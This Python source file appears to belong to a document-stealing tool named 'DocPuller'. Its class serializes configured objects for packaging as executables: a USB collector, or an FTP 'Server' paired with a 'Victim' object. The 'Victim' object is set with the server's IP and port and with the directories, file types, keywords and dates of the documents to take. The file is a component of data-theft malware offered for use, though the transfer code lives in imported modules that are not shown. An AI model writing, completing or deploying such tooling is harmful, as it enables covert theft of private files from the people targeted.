import datetime
import pickle

import dill as dill

from DocPullerScripts.DocPullerFTP.server import Server
from DocPullerScripts.DocPullerFTP.victim import Victim
from DocPullerScripts.DocPullerUsb.usb import DocPullerUSB

class FrozenObjectGeneartor:

    def __init__(self, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port

    def __create_docpuller_usb(self):
        print('createing DocpullerUsb frozen object')
        obj = DocPullerUSB(self.direcoties, self.file_type, self.keywords, self.date)

        with open(r'DocPullerScriptsToExe/DocPullerFrozenObjects/FrozenDocPullerUSB.pkl', 'wb') as file:
            dill.dump(obj, file)
            print('finish createing frozenobj file')

    def __create_docpuller_ftp_server(self):
        obj = Server(self.server_ip, self.server_port)

        with open('DocPullerScriptsToExe/DocPullerFrozenObjects/FrozenDocPullerFTPSever.pkl', 'wb') as file:
            pickle.dump(obj, file)

    def __create_docpuller_ftp_victim(self):
        obj = Victim(self.server_ip, self.server_port, self.direcoties, self.file_type, self.keywords, self.date)

        with open('DocPullerScriptsToExe/DocPullerFrozenObjects/FrozenDocPullerFTPVictim.pkl', 'wb') as file:
            dill.dump(obj, file)

    def main(self):
        print('genariting frozen objects')
        if self.is_usb:
            self.__create_docpuller_usb()
        else:
            self.__create_docpuller_ftp_server()
            self.__create_docpuller_ftp_victim()
